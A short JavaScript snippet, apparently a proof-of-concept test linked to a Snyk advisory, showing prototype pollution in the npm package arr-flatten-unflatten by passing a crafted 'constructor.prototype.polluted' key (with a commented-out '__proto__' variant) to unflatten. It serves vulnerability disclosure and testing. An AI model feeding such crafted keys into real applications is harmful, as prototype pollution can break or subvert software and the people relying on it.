// //https://snyk.io/vuln/SNYK-JS-ARRFLATTENUNFLATTEN-598396
// test("prototype pollution in arr-flatten-unflatten", () => {
console.log({}.polluted);

  const { unflatten } = require("arr-flatten-unflatten");
  //unflatten({ "__proto__.polluted": "yes" });
  unflatten({ "constructor.prototype.polluted": "yes" });
console.log({}.polluted);
// });
